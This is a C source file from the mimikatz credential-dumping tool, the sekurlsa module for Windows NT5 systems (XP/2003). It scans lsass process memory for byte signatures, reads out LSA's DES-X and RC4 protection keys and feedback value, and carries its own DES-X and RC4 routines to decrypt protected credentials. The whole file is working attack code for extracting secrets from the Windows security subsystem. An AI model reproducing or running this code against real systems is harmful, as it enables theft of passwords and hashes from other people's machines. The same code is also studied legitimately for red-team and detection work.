/*	Benjamin DELPY `gentilkiwi`
	https://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : https://creativecommons.org/licenses/by/4.0/
*/
#include "kuhl_m_sekurlsa_nt5.h"
#if !defined(_M_ARM64)
#if defined(_M_X64)
BYTE PTRN_WNT5_LsaInitializeProtectedMemory_KEY[]		= {0x33, 0xdb, 0x8b, 0xc3, 0x48, 0x83, 0xc4, 0x20, 0x5b, 0xc3};
LONG OFFS_WNT5_g_Feedback								= -67;
LONG OFFS_WNT5_g_pRandomKey								= -17;
LONG OFFS_WNT5_g_pDESXKey								= -35;
#elif defined(_M_IX86)
BYTE PTRN_WNT5_LsaInitializeProtectedMemory_KEY[]		= {0x05, 0x90, 0x00, 0x00, 0x00, 0x6a, 0x18, 0x50, 0xa3};
LONG OFFS_WNT5_g_Feedback								= 25;
LONG OFFS_WNT5_g_pRandomKey								= 9;
LONG OFFS_WNT5_g_pDESXKey								= -4;
LONG OFFS_WNT5_old_g_Feedback							= 29;
#endif

NTSTATUS kuhl_m_sekurlsa_nt5_KeyInit = STATUS_NOT_FOUND;
const PLSA_PROTECT_MEMORY kuhl_m_sekurlsa_nt5_pLsaProtectMemory = kuhl_m_sekurlsa_nt5_LsaProtectMemory, kuhl_m_sekurlsa_nt5_pLsaUnprotectMemory = kuhl_m_sekurlsa_nt5_LsaUnprotectMemory;

BYTE g_Feedback[8], g_pRandomKey[256];
SYMCRYPT_NT5_DESX_EXPANDED_KEY g_pDESXKey;

NTSTATUS kuhl_m_sekurlsa_nt5_init()
{
	if(!NT_SUCCESS(kuhl_m_sekurlsa_nt5_KeyInit))
		kuhl_m_sekurlsa_nt5_KeyInit = kuhl_m_sekurlsa_nt5_LsaInitializeProtectedMemory();
	return kuhl_m_sekurlsa_nt5_KeyInit;
}

NTSTATUS kuhl_m_sekurlsa_nt5_clean()
{
	if(NT_SUCCESS(kuhl_m_sekurlsa_nt5_KeyInit))
		kuhl_m_sekurlsa_nt5_LsaInitializeProtectedMemory();
	return STATUS_SUCCESS;
}

NTSTATUS kuhl_m_sekurlsa_nt5_LsaInitializeProtectedMemory()
{
	RtlZeroMemory(g_Feedback, sizeof(g_Feedback));
	RtlZeroMemory(g_pRandomKey, sizeof(g_pRandomKey));
	RtlZeroMemory(&g_pDESXKey, sizeof(g_pDESXKey));
	return STATUS_SUCCESS;
}

BOOL kuhl_m_sekurlsa_nt5_isOld(DWORD osBuildNumber, DWORD moduleTimeStamp)
{
	BOOL status = FALSE;
	if(osBuildNumber == KULL_M_WIN_BUILD_2K3)
	{
		if(moduleTimeStamp == 0x49901640) // up to date SP1 3290 - Mon Feb 09 12:40:48 2009 (WTF, a build number <, but timestamp >)
			status = TRUE;
		else if(moduleTimeStamp <= 0x45d70a62) // first SP2 3959 - Sat Feb 17 15:00:02 2007
			status = TRUE;
	}
	return status;
}

NTSTATUS kuhl_m_sekurlsa_nt5_acquireKeys(PKUHL_M_SEKURLSA_CONTEXT cLsass, PKULL_M_PROCESS_VERY_BASIC_MODULE_INFORMATION lsassLsaSrvModule)
{
	NTSTATUS status = STATUS_NOT_FOUND;
	KULL_M_MEMORY_ADDRESS aLsassMemory = {NULL, cLsass->hLsassMem}, aLocalMemory = {PTRN_WNT5_LsaInitializeProtectedMemory_KEY, &KULL_M_MEMORY_GLOBAL_OWN_HANDLE};
	KULL_M_MEMORY_SEARCH sMemory = {{{lsassLsaSrvModule->DllBase.address, cLsass->hLsassMem}, lsassLsaSrvModule->SizeOfImage}, NULL};
	DWORD sizeOfSearch = sizeof(PTRN_WNT5_LsaInitializeProtectedMemory_KEY);
	LONG offFeedBack = OFFS_WNT5_g_Feedback;
#if defined(_M_X64)
	LONG offset64;
#elif defined(_M_IX86)
	if(kuhl_m_sekurlsa_nt5_isOld(cLsass->osContext.BuildNumber, lsassLsaSrvModule->TimeDateStamp))
		offFeedBack = OFFS_WNT5_old_g_Feedback;
#endif
	
	if(kull_m_memory_search(&aLocalMemory, sizeOfSearch, &sMemory, FALSE))
	{
		aLsassMemory.address = (PBYTE) sMemory.result + offFeedBack;
#if defined(_M_X64)
		aLocalMemory.address = &offset64;
		if(kull_m_memory_copy(&aLocalMemory, &aLsassMemory, sizeof(LONG)))
		{
			aLsassMemory.address = (PBYTE) sMemory.result + offFeedBack + sizeof(LONG) + offset64;
#elif defined(_M_IX86)
		aLocalMemory.address = &aLsassMemory.address;
		if(kull_m_memory_copy(&aLocalMemory, &aLsassMemory, sizeof(PVOID)))
		{
#endif
			aLocalMemory.address = g_Feedback;
			if(kull_m_memory_copy(&aLocalMemory, &aLsassMemory, 8))
			{
				aLsassMemory.address = (PBYTE) sMemory.result + OFFS_WNT5_g_pDESXKey;
				if(kuhl_m_sekurlsa_nt5_acquireKey(&aLsassMemory, (PBYTE) &g_pDESXKey, sizeof(g_pDESXKey)))
				{
					aLsassMemory.address = (PBYTE) sMemory.result + OFFS_WNT5_g_pRandomKey;
					if(kuhl_m_sekurlsa_nt5_acquireKey(&aLsassMemory, g_pRandomKey, sizeof(g_pRandomKey)))
						status = STATUS_SUCCESS;
				}
			}
		}
	}
	return status;
}

BOOL kuhl_m_sekurlsa_nt5_acquireKey(PKULL_M_MEMORY_ADDRESS aLsassMemory, PBYTE Key, SIZE_T taille)
{
	BOOL status = FALSE;
	KULL_M_MEMORY_ADDRESS aLocalMemory = {&aLsassMemory->address, &KULL_M_MEMORY_GLOBAL_OWN_HANDLE};
#if defined(_M_X64)
	LONG offset64;
	aLocalMemory.address = &offset64;
	if(kull_m_memory_copy(&aLocalMemory, aLsassMemory, sizeof(LONG)))
	{
		aLsassMemory->address = (PBYTE) aLsassMemory->address + sizeof(LONG) + offset64;
		aLocalMemory.address = &aLsassMemory->address;
#elif defined(_M_IX86)
	if(kull_m_memory_copy(&aLocalMemory, aLsassMemory, sizeof(PVOID)))
	{
#endif
		if(kull_m_memory_copy(&aLocalMemory, aLsassMemory, sizeof(PVOID)))
		{
			aLocalMemory.address = Key;
			status = kull_m_memory_copy(&aLocalMemory, aLsassMemory, taille);
		}
	}
	return status;
}

VOID WINAPI kuhl_m_sekurlsa_nt5_LsaProtectMemory(IN PVOID Buffer, IN ULONG BufferSize)
{
	kuhl_m_sekurlsa_nt5_LsaEncryptMemory((PUCHAR) Buffer, BufferSize, TRUE);
}

VOID WINAPI kuhl_m_sekurlsa_nt5_LsaUnprotectMemory(IN PVOID Buffer, IN ULONG BufferSize)
{
	kuhl_m_sekurlsa_nt5_LsaEncryptMemory((PUCHAR) Buffer, BufferSize, FALSE);
}

NTSTATUS kuhl_m_sekurlsa_nt5_LsaEncryptMemory(PUCHAR pMemory, ULONG cbMemory, BOOL Encrypt)
{
	NTSTATUS status = STATUS_SUCCESS;
	SYMCRYPT_RC4_STATE rc4state;
	BYTE ChainingValue[8];
	PCRYPT_ENCRYPT cryptFunc;
	if(cbMemory % 8)
	{
		if(SymCryptRc4Init2(&rc4state, g_pRandomKey, sizeof(g_pRandomKey)))
			SymCryptRc4Crypt2(&rc4state, pMemory, pMemory, cbMemory);
		else status = STATUS_CRYPTO_SYSTEM_INVALID;
	}
	else
	{
		cryptFunc = Encrypt ? SymCryptDesxCbcEncrypt2 : SymCryptDesxCbcDecrypt2;
		RtlCopyMemory(ChainingValue, g_Feedback, 8);
		cryptFunc(&g_pDESXKey, ChainingValue, pMemory, pMemory, cbMemory);
	}
	return status;
}

/*	All code below is very (very) inspired from Microsoft SymCrypt
	> https://github.com/Microsoft/SymCrypt
	Lots of thanks to Niels Ferguson ( https://github.com/NielsFerguson )

	Was not able to use CryptoAPI because:
	- DES-X is not supported
		- even if, DES-X main DES key is stored already scheduled, so not compatible with CryptoAPI
	- RC4 is not supported with key > 128 bits (LSA uses one of 2048 bits)

	A good example of 'do not use what I use'
*/
const UINT32 SymCryptDesSpbox[8][64] = {
	0x02080800, 0x00080000, 0x02000002, 0x02080802, 0x02000000, 0x00080802, 0x00080002, 0x02000002, 0x00080802, 0x02080800, 0x02080000, 0x00000802, 0x02000802, 0x02000000, 0x00000000, 0x00080002,
	0x00080000, 0x00000002, 0x02000800, 0x00080800, 0x02080802, 0x02080000, 0x00000802, 0x02000800, 0x00000002, 0x00000800, 0x00080800, 0x02080002, 0x00000800, 0x02000802, 0x02080002, 0x00000000,
	0x00000000, 0x02080802, 0x02000800, 0x00080002, 0x02080800, 0x00080000, 0x00000802, 0x02000800, 0x02080002, 0x00000800, 0x00080800, 0x02000002, 0x00080802, 0x00000002, 0x02000002, 0x02080000,
	0x02080802, 0x00080800, 0x02080000, 0x02000802, 0x02000000, 0x00000802, 0x00080002, 0x00000000, 0x00080000, 0x02000000, 0x02000802, 0x02080800, 0x00000002, 0x02080002, 0x00000800, 0x00080802,
	0x40108010, 0x00000000, 0x00108000, 0x40100000, 0x40000010, 0x00008010, 0x40008000, 0x00108000, 0x00008000, 0x40100010, 0x00000010, 0x40008000, 0x00100010, 0x40108000, 0x40100000, 0x00000010,
	0x00100000, 0x40008010, 0x40100010, 0x00008000, 0x00108010, 0x40000000, 0x00000000, 0x00100010, 0x40008010, 0x00108010, 0x40108000, 0x40000010, 0x40000000, 0x00100000, 0x00008010, 0x40108010,
	0x00100010, 0x40108000, 0x40008000, 0x00108010, 0x40108010, 0x00100010, 0x40000010, 0x00000000, 0x40000000, 0x00008010, 0x00100000, 0x40100010, 0x00008000, 0x40000000, 0x00108010, 0x40008010,
	0x40108000, 0x00008000, 0x00000000, 0x40000010, 0x00000010, 0x40108010, 0x00108000, 0x40100000, 0x40100010, 0x00100000, 0x00008010, 0x40008000, 0x40008010, 0x00000010, 0x40100000, 0x00108000,
	0x04000001, 0x04040100, 0x00000100, 0x04000101, 0x00040001, 0x04000000, 0x04000101, 0x00040100, 0x04000100, 0x00040000, 0x04040000, 0x00000001, 0x04040101, 0x00000101, 0x00000001, 0x04040001,
	0x00000000, 0x00040001, 0x04040100, 0x00000100, 0x00000101, 0x04040101, 0x00040000, 0x04000001, 0x04040001, 0x04000100, 0x00040101, 0x04040000, 0x00040100, 0x00000000, 0x04000000, 0x00040101,
	0x04040100, 0x00000100, 0x00000001, 0x00040000, 0x00000101, 0x00040001, 0x04040000, 0x04000101, 0x00000000, 0x04040100, 0x00040100, 0x04040001, 0x00040001, 0x04000000, 0x04040101, 0x00000001,
	0x00040101, 0x04000001, 0x04000000, 0x04040101, 0x00040000, 0x04000100, 0x04000101, 0x00040100, 0x04000100, 0x00000000, 0x04040001, 0x00000101, 0x04000001, 0x00040101, 0x00000100, 0x04040000,
	0x00401008, 0x10001000, 0x00000008, 0x10401008, 0x00000000, 0x10400000, 0x10001008, 0x00400008, 0x10401000, 0x10000008, 0x10000000, 0x00001008, 0x10000008, 0x00401008, 0x00400000, 0x10000000,
	0x10400008, 0x00401000, 0x00001000, 0x00000008, 0x00401000, 0x10001008, 0x10400000, 0x00001000, 0x00001008, 0x00000000, 0x00400008, 0x10401000, 0x10001000, 0x10400008, 0x10401008, 0x00400000,
	0x10400008, 0x00001008, 0x00400000, 0x10000008, 0x00401000, 0x10001000, 0x00000008, 0x10400000, 0x10001008, 0x00000000, 0x00001000, 0x00400008, 0x00000000, 0x10400008, 0x10401000, 0x00001000,
	0x10000000, 0x10401008, 0x00401008, 0x00400000, 0x10401008, 0x00000008, 0x10001000, 0x00401008, 0x00400008, 0x00401000, 0x10400000, 0x10001008, 0x00001008, 0x10000000, 0x10000008, 0x10401000,
	0x08000000, 0x00010000, 0x00000400, 0x08010420, 0x08010020, 0x08000400, 0x00010420, 0x08010000, 0x00010000, 0x00000020, 0x08000020, 0x00010400, 0x08000420, 0x08010020, 0x08010400, 0x00000000,
	0x00010400, 0x08000000, 0x00010020, 0x00000420, 0x08000400, 0x00010420, 0x00000000, 0x08000020, 0x00000020, 0x08000420, 0x08010420, 0x00010020, 0x08010000, 0x00000400, 0x00000420, 0x08010400,
	0x08010400, 0x08000420, 0x00010020, 0x08010000, 0x00010000, 0x00000020, 0x08000020, 0x08000400, 0x08000000, 0x00010400, 0x08010420, 0x00000000, 0x00010420, 0x08000000, 0x00000400, 0x00010020,
	0x08000420, 0x00000400, 0x00000000, 0x08010420, 0x08010020, 0x08010400, 0x00000420, 0x00010000, 0x00010400, 0x08010020, 0x08000400, 0x00000420, 0x00000020, 0x00010420, 0x08010000, 0x08000020,
	0x80000040, 0x00200040, 0x00000000, 0x80202000, 0x00200040, 0x00002000, 0x80002040, 0x00200000, 0x00002040, 0x80202040, 0x00202000, 0x80000000, 0x80002000, 0x80000040, 0x80200000, 0x00202040,
	0x00200000, 0x80002040, 0x80200040, 0x00000000, 0x00002000, 0x00000040, 0x80202000, 0x80200040, 0x80202040, 0x80200000, 0x80000000, 0x00002040, 0x00000040, 0x00202000, 0x00202040, 0x80002000,
	0x00002040, 0x80000000, 0x80002000, 0x00202040, 0x80202000, 0x00200040, 0x00000000, 0x80002000, 0x80000000, 0x00002000, 0x80200040, 0x00200000, 0x00200040, 0x80202040, 0x00202000, 0x00000040,
	0x80202040, 0x00202000, 0x00200000, 0x80002040, 0x80000040, 0x80200000, 0x00202040, 0x00000000, 0x00002000, 0x80000040, 0x80002040, 0x80202000, 0x80200000, 0x00002040, 0x00000040, 0x80200040,
	0x00004000, 0x00000200, 0x01000200, 0x01000004, 0x01004204, 0x00004004, 0x00004200, 0x00000000, 0x01000000, 0x01000204, 0x00000204, 0x01004000, 0x00000004, 0x01004200, 0x01004000, 0x00000204,
	0x01000204, 0x00004000, 0x00004004, 0x01004204, 0x00000000, 0x01000200, 0x01000004, 0x00004200, 0x01004004, 0x00004204, 0x01004200, 0x00000004, 0x00004204, 0x01004004, 0x00000200, 0x01000000,
	0x00004204, 0x01004000, 0x01004004, 0x00000204, 0x00004000, 0x00000200, 0x01000000, 0x01004004, 0x01000204, 0x00004204, 0x00004200, 0x00000000, 0x00000200, 0x01000004, 0x00000004, 0x01000200,
	0x00000000, 0x01000204, 0x01000200, 0x00004200, 0x00000204, 0x00004000, 0x01004204, 0x01000000, 0x01004200, 0x00000004, 0x00004004, 0x01004204, 0x01000004, 0x01004200, 0x01004000, 0x00004004,
	0x20800080, 0x20820000, 0x00020080, 0x00000000, 0x20020000, 0x00800080, 0x20800000, 0x20820080, 0x00000080, 0x20000000, 0x00820000, 0x00020080, 0x00820080, 0x20020080, 0x20000080, 0x20800000,
	0x00020000, 0x00820080, 0x00800080, 0x20020000, 0x20820080, 0x20000080, 0x00000000, 0x00820000, 0x20000000, 0x00800000, 0x20020080, 0x20800080, 0x00800000, 0x00020000, 0x20820000, 0x00000080,
	0x00800000, 0x00020000, 0x20000080, 0x20820080, 0x00020080, 0x20000000, 0x00000000, 0x00820000, 0x20800080, 0x20020080, 0x20020000, 0x00800080, 0x20820000, 0x00000080, 0x00800080, 0x20020000,
	0x20820080, 0x00800000, 0x20800000, 0x20000080, 0x00820000, 0x00020080, 0x20020080, 0x20800000, 0x00000080, 0x20820000, 0x00820080, 0x00000000, 0x20000000, 0x20800080, 0x00020000, 0x00820080,
};

VOID SymCryptDesGenCrypt2(PCSYMCRYPT_NT5_DES_EXPANDED_KEY pExpandedKey, LPCBYTE pbSrc, PBYTE pbDst, BOOL Encrypt)
{
	UINT32 L = *(UINT32 *) (pbSrc + 4), R = *(UINT32 *) (pbSrc + 0), Ta, Tb;
	int r;

	R = ROL32(R, 4);
	Ta = (L ^ R) & 0xf0f0f0f0;
	L ^= Ta;
	R ^= Ta;
	L = ROL32(L, 20);
	Ta = (L ^ R) & 0xfff0000f;
	L ^= Ta;
	R ^= Ta;
	L = ROL32(L, 14);
	Ta = (L ^ R) & 0x33333333;
	L ^= Ta;
	R ^= Ta;
	R = ROL32(R, 22);
	Ta = (L ^ R) & 0x03fc03fc;
	L ^= Ta;
	R ^= Ta;
	R = ROL32(R, 9);
	Ta = (L ^ R) & 0xaaaaaaaa;
	L ^= Ta;
	R ^= Ta;
	L = ROL32(L, 1);

	if(Encrypt)
	{
		for(r = 0; r < 16; r += 2)
		{
			F(L, R, pExpandedKey->roundKey[r  ]);
			F(R, L, pExpandedKey->roundKey[r+1]);
		}
	}
	else
	{
		for(r = 14; r >= 0 ; r -= 2)
		{
			F(L, R, pExpandedKey->roundKey[r+1]);
			F(R, L, pExpandedKey->roundKey[r]);
		}
	}

	R = ROR32(R, 1);
	Ta = (L ^ R) & 0xaaaaaaaa;
	L ^= Ta;
	R ^= Ta;
	L = ROR32(L, 9);
	Ta = (L ^ R) & 0x03fc03fc;
	L ^= Ta;
	R ^= Ta;
	L = ROR32(L, 22);
	Ta = (L ^ R) & 0x33333333;
	L ^= Ta;
	R ^= Ta;
	R = ROR32(R, 14);
	Ta = (L ^ R) & 0xfff0000f;
	L ^= Ta;
	R ^= Ta;
	R = ROR32(R, 20);
	Ta = (L ^ R) & 0xf0f0f0f0;
	L ^= Ta;
	R ^= Ta;
	L = ROR32(L, 4);
	*(UINT32 *) (pbDst + 0) = L;
	*(UINT32 *) (pbDst + 4) = R;
}

VOID SymCryptDesxDecrypt2(PCSYMCRYPT_NT5_DESX_EXPANDED_KEY pExpandedKey, LPCBYTE pbSrc, PBYTE pbDst)
{
	*(PULONGLONG) pbDst = *(PULONGLONG) pbSrc ^ *(PULONGLONG) pExpandedKey->outputWhitening;
	SymCryptDesGenCrypt2(&pExpandedKey->desKey, pbDst, pbDst, FALSE);
	*(PULONGLONG) pbDst ^= *(PULONGLONG) pExpandedKey->inputWhitening;
}

VOID SymCryptDesxEncrypt2(PCSYMCRYPT_NT5_DESX_EXPANDED_KEY pExpandedKey, LPCBYTE pbSrc, PBYTE pbDst)
{
	*(PULONGLONG) pbDst = *(PULONGLONG) pbSrc ^ *(PULONGLONG) pExpandedKey->inputWhitening;
	SymCryptDesGenCrypt2(&pExpandedKey->desKey, pbDst, pbDst, TRUE);
	*(PULONGLONG) pbDst ^= *(PULONGLONG) pExpandedKey->outputWhitening;
}

VOID SymCryptDesxCbcDecrypt2(PCSYMCRYPT_NT5_DESX_EXPANDED_KEY pExpandedKey, PBYTE pbChainingValue, LPCBYTE pbSrc, PBYTE pbDst, SIZE_T cbData)
{
	LPCBYTE pbSrcEnd;
	BYTE buf[8];
	for(pbSrcEnd = &pbSrc[cbData & ~7]; pbSrc < pbSrcEnd; pbDst += 8, pbSrc += 8)
	{
		RtlCopyMemory(buf, pbSrc, 8);
		SymCryptDesxDecrypt2(pExpandedKey, pbSrc, pbDst);
		*(PULONGLONG) pbDst ^= *(PULONGLONG) pbChainingValue;
		RtlCopyMemory(pbChainingValue, buf, 8);
	}
}

VOID SymCryptDesxCbcEncrypt2(PCSYMCRYPT_NT5_DESX_EXPANDED_KEY pExpandedKey, PBYTE pbChainingValue, LPCBYTE pbSrc, PBYTE pbDst, SIZE_T cbData)
{
	LPCBYTE pbSrcEnd;
	for(pbSrcEnd = &pbSrc[cbData & ~7]; pbSrc < pbSrcEnd; pbSrc += 8, pbDst += 8)
	{
		*(PULONGLONG) pbChainingValue ^= *(PULONGLONG) pbSrc;
		SymCryptDesxEncrypt2(pExpandedKey, pbChainingValue, pbDst);
		RtlCopyMemory(pbChainingValue, pbDst, 8);
	}
}

BOOL SymCryptRc4Init2(PSYMCRYPT_RC4_STATE pState, LPCBYTE pbKey, SIZE_T cbKey)
{
	BOOL status = cbKey && (cbKey <= 256);
	SIZE_T i, j, keyIdx;
	BYTE T;

	if(status)
	{
		for(i = 0; i < 256; i++)
			pState->S[i] = (BYTE) i;
		j = 0;
		keyIdx = 0;
		for(i = 0; i < 256; i++)
		{
			T = pState->S[i];
			j = (j + T + pbKey[keyIdx]) & 0xff;
			pState->S[i] = pState->S[j];
			pState->S[j] = T;
			keyIdx++;
			if(keyIdx == cbKey)
				keyIdx = 0;
		}
		pState->i = 1;
		pState->j = 0;
	}
	return status;
}

VOID SymCryptRc4Crypt2(PSYMCRYPT_RC4_STATE pState, LPCBYTE pbSrc, PBYTE pbDst, SIZE_T cbData)
{
    BYTE Ti, Tj;
    LPCBYTE pbSrcEnd;
	for(pbSrcEnd = pbSrc + cbData; pbSrc < pbSrcEnd; pbSrc++, pbDst++)
	{
		Ti = pState->S[pState->i];
		pState->j = (pState->j + Ti );
		Tj = pState->S[pState->j];
		pState->S[pState->i] = Tj;
		pState->S[pState->j] = Ti;
		*pbDst = (*pbSrc ^ pState->S[(Ti + Tj) & 0xff]);
		pState->i = (pState->i + 1);
	}
}
#endif